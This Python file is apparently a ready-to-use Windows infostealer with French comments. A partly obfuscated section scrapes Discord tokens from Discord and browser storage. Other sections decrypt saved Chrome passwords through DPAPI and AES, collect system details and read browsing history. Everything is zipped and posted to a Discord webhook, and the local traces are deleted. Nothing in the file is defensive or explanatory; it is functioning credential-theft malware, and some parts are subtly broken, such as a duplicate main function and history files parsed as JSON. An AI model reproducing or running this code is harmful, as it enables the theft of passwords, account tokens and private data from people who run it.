import os
import re
import json
import base64
import sqlite3
import win32crypt
import shutil
import zipfile
import requests
import platform
import socket
import uuid
import psutil
import logging
import subprocess
import sys
import winreg
from requests_toolbelt.multipart.encoder import MultipartEncoder
from datetime import datetime
from Crypto.Cipher import AES
from datetime import timedelta, datetime
from discord_webhook import DiscordWebhook
from urllib .request import Request ,urlopen #line:5

# def webhook url

WEBURL = "YOUR WEBHOOK URL"

# tokens

WEBHOOK_URL = WEBURL
PING_ME =False #line:11
def find_tokens (O0OO000OO00OOOOO0 ):#line:13
    O0OO000OO00OOOOO0 +='\\Local Storage\\leveldb'#line:14
    O0O0OO000O0OO00O0 =[]#line:16
    for O0OO00O0OOO000000 in os .listdir (O0OO000OO00OOOOO0 ):#line:18
        if not O0OO00O0OOO000000 .endswith ('.log')and not O0OO00O0OOO000000 .endswith ('.ldb'):#line:19
            continue #line:20
        for O000OOO0OO0OOOOOO in [O00O0OO0O00OOO000 .strip ()for O00O0OO0O00OOO000 in open (f'{O0OO000OO00OOOOO0}\\{O0OO00O0OOO000000}',errors ='ignore').readlines ()if O00O0OO0O00OOO000 .strip ()]:#line:22
            for OOO0OOOO0O00OO00O in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}',r'mfa\.[\w-]{84}'):#line:23
                for OO0O0OO0O00O0O000 in re .findall (OOO0OOOO0O00OO00O ,O000OOO0OO0OOOOOO ):#line:24
                    O0O0OO000O0OO00O0 .append (OO0O0OO0O00O0O000 )#line:25
    return O0O0OO000O0OO00O0 #line:26
def main ():#line:28
    O000OO0O0OO0O0O0O =os .getenv ('LOCALAPPDATA')#line:29
    O000O0O0OO00OO0O0 =os .getenv ('APPDATA')#line:30
    O00000OOOO0000000 ={'Discord':O000O0O0OO00OO0O0 +'\\Discord','Discord Canary':O000O0O0OO00OO0O0 +'\\discordcanary','Discord PTB':O000O0O0OO00OO0O0 +'\\discordptb','Google Chrome':O000OO0O0OO0O0O0O +'\\Google\\Chrome\\User Data\\Default','Opera':O000O0O0OO00OO0O0 +'\\Opera Software\\Opera Stable','Brave':O000OO0O0OO0O0O0O +'\\BraveSoftware\\Brave-Browser\\User Data\\Default','Yandex':O000OO0O0OO0O0O0O +'\\Yandex\\YandexBrowser\\User Data\\Default'}#line:40
    O0O00OO0O0OO00OO0 ='@everyone'if PING_ME else ''#line:42
    for OO000OOOOO0O0O0OO ,OO0OOO00O0O0OO000 in O00000OOOO0000000 .items ():#line:44
        if not os .path .exists (OO0OOO00O0O0OO000 ):#line:45
            continue #line:46
        O0O00OO0O0OO00OO0 +=f'\n**{OO000OOOOO0O0O0OO}**\n```\n'#line:48
        O0OOOO0O00OOO0OOO =find_tokens (OO0OOO00O0O0OO000 )#line:50
        if len (O0OOOO0O00OOO0OOO )>0 :#line:52
            for O0O00OO0O0O0OO0O0 in O0OOOO0O00OOO0OOO :#line:53
                O0O00OO0O0OO00OO0 +=f'{O0O00OO0O0O0OO0O0}\n'#line:54
        else :#line:55
            O0O00OO0O0OO00OO0 +='No tokens found.\n'#line:56
        O0O00OO0O0OO00OO0 +='```'#line:58
    O0OO000O0OOOO0O0O ={'Content-Type':'application/json','User-Agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'}#line:63
    OOO00O0000OOOOOOO =json .dumps ({'content':O0O00OO0O0OO00OO0 })#line:65
    try :#line:67
        O00OO00OOOO00OO00 =Request (WEBHOOK_URL ,data =OOO00O0000OOOOOOO .encode (),headers =O0OO000O0OOOO0O0O )#line:68
        urlopen (O00OO00OOOO00OO00 )#line:69
    except :#line:70
        pass #line:71

# sys info

# Définir l'URL du webhook Discord
discord_webhook_url = WEBURL

# Récupérer les informations système
try:
    cpu_name = subprocess.check_output('wmic cpu get name', shell=True).decode().split('\n')[1].strip()
except subprocess.CalledProcessError:
    cpu_name = platform.processor()

try:
    ram_size = float(subprocess.check_output('wmic memphysical get MaxMember', shell=True).decode().split()[1]) / 1024
except subprocess.CalledProcessError:
    ram_size = psutil.virtual_memory().total / (1024.0 ** 3)

disk_size = psutil.disk_usage('/').total / (1024.0 ** 3)

system_info = """
**Informations système :**
- Système d'exploitation: {} {}
- Architecture: {}
- Version de Python: {}
- CPU: {}
- RAM: {:.2f} GB
- Disque dur: {:.2f} GB
""".format(
    platform.system(),
    platform.release(),
    platform.machine(),
    platform.python_version(),
    cpu_name,
    ram_size,
    disk_size
)

# Envoyer le message via le webhook Discord
payload = {
    "content": system_info
}
response = requests.post(discord_webhook_url, json=payload)

if response.status_code == 204:
    print("Informations système envoyées avec succès sur Discord.")
else:
    print("Une erreur est survenue lors de l'envoi des informations système sur Discord.")

# passwords

def get_chrome_datetime(chromedate):
    """Return a `datetime.datetime` object from a chrome format datetime
    Since `chromedate` is formatted as the number of microseconds since January, 1601"""
    return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)

def get_encryption_key():
    local_state_path = os.path.join(os.environ["USERPROFILE"],
                                    "AppData", "Local", "Google", "Chrome",
                                    "User Data", "Local State")
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = f.read()
        local_state = json.loads(local_state)

    # decode the encryption key from Base64
    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    # remove DPAPI str
    key = key[5:]
    # return decrypted key that was originally encrypted
    # using a session key derived from the current user's logon credentials
    # doc: http://timgolden.me.uk/pywin32-docs/win32crypt.html
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]


def decrypt_password(password, key):
    try:
        # get the initialization vector
        iv = password[3:15]
        password = password[15:]
        # generate cipher
        cipher = AES.new(key, AES.MODE_GCM, iv)
        # decrypt password
        return cipher.decrypt(password)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            # not supported
            return ""
        
if __name__ == "__main__":
    main()


def main():
    # get the AES key
    key = get_encryption_key()
    # local sqlite Chrome database path
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                            "Google", "Chrome", "User Data", "default", "Login Data")
    # copy the file to another location
    # as the database will be locked if Chrome is currently running
    filename = "ChromeData.db"
    shutil.copyfile(db_path, filename)
    # connect to the database
    db = sqlite3.connect(filename)
    cursor = db.cursor()

    # Create a temporary file to store the decrypted passwords
    temp_filename = "decrypted_passwords.txt"
    with open(temp_filename, "w", encoding="utf-8") as temp_file:
        # `logins` table has the data we need
        cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
        
        # iterate over all rows
        for row in cursor.fetchall():
            origin_url = row[0]
            action_url = row[1]
            username = row[2]
            password = decrypt_password(row[3], key)
            date_created = row[4]
            date_last_used = row[5]
            
            # Encode the text using UTF-8 and handle any characters that cannot be encoded
            temp_file.write(f"Origin URL: {origin_url.encode('utf-8', 'replace').decode('utf-8')}\n")
            temp_file.write(f"Action URL: {action_url.encode('utf-8', 'replace').decode('utf-8')}\n")
            temp_file.write(f"Username: {username.encode('utf-8', 'replace').decode('utf-8')}\n")
            temp_file.write(f"Password: {password.encode('utf-8', 'replace').decode('utf-8')}\n")
            
            if date_created != 86400000000 and date_created:
                temp_file.write(f"Creation date: {str(get_chrome_datetime(date_created))}\n")
            if date_last_used != 86400000000 and date_last_used:
                temp_file.write(f"Last Used: {str(get_chrome_datetime(date_last_used))}\n")
            temp_file.write("=" * 50 + "\n")

    cursor.close()
    db.close()

    # Create a zip file containing the decrypted passwords
    zip_filename = "decrypted_passwords.zip"
    with zipfile.ZipFile(zip_filename, "w") as zip_file:
        zip_file.write(temp_filename)

    # Send the zip file to a Discord webhook
    webhook_url = WEBURL
    with open(zip_filename, "rb") as file:
        requests.post(webhook_url, files={"file": file})

    # Delete the decrypted passwords file and the zip file
    os.remove(temp_filename)
    os.remove(zip_filename)
    try:
        # try to remove the copied db file
        os.remove(filename)
    except:
        pass


if __name__ == "__main__":
    main()

# history

# Définir l'URL du webhook Discord
discord_webhook_url = WEBURL

# Fonction pour identifier le navigateur web
def get_browser_name():
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run")
        value, _ = winreg.QueryValueEx(key, "Google Chrome")
        return "Google Chrome"
    except:
        pass

    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run")
        value, _ = winreg.QueryValueEx(key, "Microsoft Edge")
        return "Microsoft Edge"
    except:
        pass

    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Mozilla\Firefox")
        _, _, path, _ = winreg.EnumValue(key, 0)
        return "Mozilla Firefox"
    except:
        pass

    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Opera Software\Opera Stable")
        _, _, path, _ = winreg.EnumValue(key, 0)
        return "Opera"
    except:
        pass

    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Brave")
        _, _, path, _ = winreg.EnumValue(key, 0)
        return "Brave"
    except:
        pass

    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Vivaldi\Vivaldi")
        _, _, path, _ = winreg.EnumValue(key, 0)
        return "Vivaldi"
    except:
        pass

    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Internet Explorer\Main")
        _, _, path, _ = winreg.EnumValue(key, 0)
        return "Internet Explorer"
    except:
        pass

    return "Unknown"

# Récupérer l'historique de navigation
def get_browser_history(browser_name):
    history = []
    if browser_name == "Google Chrome":
        try:
            chrome_history_path = os.path.expanduser("~") + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History"
            with open(chrome_history_path, 'r', encoding='utf-8') as f:
                chrome_history = json.load(f)
            history.extend(chrome_history)
        except:
            pass
    elif browser_name == "Microsoft Edge":
        try:
            edge_history_path = os.path.expanduser("~") + "\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\History"
            with open(edge_history_path, 'r', encoding='utf-8') as f:
                edge_history = json.load(f)
            history.extend(edge_history)
        except:
            pass
    elif browser_name == "Mozilla Firefox":
        try:
            firefox_history_path = os.path.expanduser("~") + "\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\default.aws\\places.sqlite"
            import sqlite3
            conn = sqlite3.connect(firefox_history_path)
            c = conn.cursor()
            c.execute("SELECT url, title, visit_count, last_visit_date FROM moz_places")
            firefox_history = c.fetchall()
            for url, title, visit_count, last_visit_date in firefox_history:
                history.append({"url": url, "title": title, "visit_count": visit_count, "last_visit_date": last_visit_date})
        except:
            pass
    elif browser_name == "Opera":
        try:
            opera_history_path = os.path.expanduser("~") + "\\AppData\\Roaming\\Opera Software\\Opera Stable\\History"
            with open(opera_history_path, 'r', encoding='utf-8') as f:
                opera_history = json.load(f)
            history.extend(opera_history)
        except:
            pass
    elif browser_name == "Brave":
        try:
            brave_history_path = os.path.expanduser("~") + "\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\History"
            with open(brave_history_path, 'r', encoding='utf-8') as f:
                brave_history = json.load(f)
            history.extend(brave_history)
        except:
            pass
    elif browser_name == "Vivaldi":
        try:
            vivaldi_history_path = os.path.expanduser("~") + "\\AppData\\Local\\Vivaldi\\User Data\\Default\\History"
            with open(vivaldi_history_path, 'r', encoding='utf-8') as f:
                vivaldi_history = json.load(f)
            history.extend(vivaldi_history)
        except:
            pass
    elif browser_name == "Internet Explorer":
        try:
            ie_history_path = os.path.expanduser("~") + "\\AppData\\Local\\Microsoft\\Windows\\WebCache\\WebCacheV01.dat"
            with open(ie_history_path, 'rb') as f:
                ie_history = f.read()
            history.append({"data": ie_history})
        except:
            pass
    return history

# Envoyer l'historique de navigation via le webhook Discord
def send_history_to_discord():
    browser_name = get_browser_name()
    history = get_browser_history(browser_name)

    # Créer un fichier ZIP avec l'historique de navigation
    zip_filename = f"{browser_name}_browser_history_{datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.zip"
    with zipfile.ZipFile(zip_filename, 'w') as zip_file:
        json_data = json.dumps(history, indent=4)
        zip_file.writestr(f"{browser_name}_browser_history.json", json_data)

    # Envoyer le fichier ZIP via le webhook Discord
    with open(zip_filename, 'rb') as f:
        multipart_data = MultipartEncoder(
            fields={
                "content": f"Historique de navigation pour {browser_name}",
                "file": (f"{browser_name}_browser_history.zip", f, "application/zip")
            }
        )
        headers = {
            "Content-Type": multipart_data.content_type
        }
        import requests
        response = requests.post(discord_webhook_url, data=multipart_data, headers=headers)

    # Supprimer le fichier ZIP temporaire
    os.remove(zip_filename)

    if response.status_code == 204:
        print(f"Historique de navigation pour {browser_name} envoyé avec succès sur Discord.")
    else:
        print(f"Une erreur est survenue lors de l'envoi de l'histore")

if __name__ == "__main__":
    send_history_to_discord()

